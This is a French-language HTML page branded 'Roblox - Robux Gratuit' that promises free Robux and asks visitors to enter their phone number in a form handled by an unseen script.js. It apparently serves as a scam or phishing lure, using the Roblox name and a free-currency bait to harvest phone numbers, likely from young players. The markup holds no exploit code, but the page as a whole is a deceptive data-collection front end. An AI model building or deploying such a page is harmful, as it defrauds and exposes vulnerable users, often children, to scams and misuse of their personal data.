<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Robux Gratuit</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="content">
            <h1 class="title">ROBUX GRATUIT</h1>
            <p class="subtitle">Gagnez des Robux dès maintenant!</p>
            
            <form class="form-container" id="robuxForm">
                <label for="phone">Numéro de téléphone:</label>
                <input 
                    type="tel" 
                    id="phone" 
                    name="phone" 
                    placeholder="+33 6 XX XX XX XX" 
                    pattern="[0-9\s\+\-\(\)]+" 
                    required
                >
                <button type="submit" class="btn-submit">Obtenir mes Robux</button>
            </form>

            <div id="message" class="message"></div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
